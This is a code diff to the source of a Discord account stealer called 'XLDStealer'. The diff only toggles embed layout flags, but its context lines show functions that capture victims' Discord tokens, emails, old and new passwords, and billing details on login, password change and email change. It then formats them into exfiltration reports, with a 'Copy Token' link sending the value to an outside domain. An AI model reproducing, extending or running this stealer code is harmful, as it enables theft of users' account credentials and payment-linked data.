@@ -78,10 +78,10 @@ function FirstTime() {
                       {
                         name: "<a:boostlevel:966792429443379281> Badges",
                         value: `${GetBadges(n.flags)}`,
-                        inline: !1,
+                        inline: !0,
                       },
-                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${e}\`\`\``, inline: !1 },
-                      { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},  ],
+                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${e}\`\`\``, inline: !0 },
+                      { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0},  ],
                     author: { name: "XLDStealer" },
                     footer: { text: "XLDStealer" },
                     thumbnail: {
@@ -151,14 +151,14 @@ function FirstTime() {
                         {
                           name: "<a:boostlevel:966792429443379281> Badges",
                           value: `${GetBadges(n.flags)}`,
-                          inline: !1,
+                          inline: !0,
                         },
                         {
                           name: "Token",
                           value: `\`\`\`${e}\`\`\``,
-                          inline: !1,
+                          inline: !0,
                         },
-                         { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},
+                         { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0},
                       ],
                       author: { name: "XLDStealer" },
                       footer: { text: "XLDStealer" },
@@ -322,12 +322,12 @@ function Login(e, t, n) {
                           {
                             name: "<:nitro:966790472968339576> Nitro",
                             value: `${GetNitro(i.premium_type)}`,
-                            inline: !1,
+                            inline: !0,
                           },
                           {
                             name: "<a:boostlevel:966792429443379281> Badges",
                             value: `${GetBadges(i.flags)}`,
-                            inline: !1,
+                            inline: !0,
                           },
                           {
                             name: "<:creditcard:966803519627743273> Billing",
@@ -349,16 +349,16 @@ function Login(e, t, n) {
                                 t
                               );
                             })()}`,
-                            inline: !1,
+                            inline: !0,
                           },
                           { name: "<:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                           { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                           {
                             name: "<:question:966655842202050570> Token",
                             value: `\`\`\`${n}\`\`\``,
-                            inline: !1,
+                            inline: !0,
                           },
-                           { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},
+                           { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0},
                         ],
                         author: { name: "XLDStealer" },
                         footer: { text: "XLDStealer" },
@@ -440,12 +440,12 @@ function ChangePassword(e, t, n) {
                       {
                         name: "<:nitro:966790472968339576> Nitro",
                         value: `${GetNitro(s.premium_type)}`,
-                        inline: !1,
+                        inline: !0,
                       },
                       {
                         name: "<a:boostlevel:966792429443379281> Badges",
                         value: `${GetBadges(s.flags)}`,
-                        inline: !1,
+                        inline: !0,
                       },
                       {
                         name: "<:creditcard:966803519627743273> Billing",
@@ -467,13 +467,13 @@ function ChangePassword(e, t, n) {
                             t
                           );
                         })()}`,
-                        inline: !1,
+                        inline: !0,
                       },
-                      { name: "<:gmail:966790304701235230> Email", value: `\`${s.email}\``, inline: !1 },
+                      { name: "<:gmail:966790304701235230> Email", value: `\`${s.email}\``, inline: !0 },
                       { name: "Old <:lock:966790360409989171> Password", value: `\`${e}\``, inline: !0 },
                       { name: "New <:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
-                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
-                   { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1},  ],
+                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !0 },
+                   { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0},  ],
                     author: { name: "XLDStealer" },
                     footer: { text: "XLDStealer" },
                     thumbnail: {
@@ -530,12 +530,12 @@ function ChangeEmail(e, t, n) {
                       {
                         name: "<:nitro:966790472968339576> Nitro",
                         value: `${GetNitro(s.premium_type)}`,
-                        inline: !1,
+                        inline: !0,
                       },
                       {
                         name: "<a:boostlevel:966792429443379281> Badges",
                         value: `${GetBadges(s.flags)}`,
-                        inline: !1,
+                        inline: !0,
                       },
                       {
                         name: "<:creditcard:966803519627743273> Billing",
@@ -557,12 +557,12 @@ function ChangeEmail(e, t, n) {
                             t
                           );
                         })()}`,
-                        inline: !1,
+                        inline: !0,
                       },
                       { name: "New <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                       { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
-                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
-                    { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !1}, ],
+                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !0 },
+                    { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0}, ],
                     author: { name: "XLDPirateStealer" },
                     footer: { text: "XLDStealer" },
                     thumbnail: {
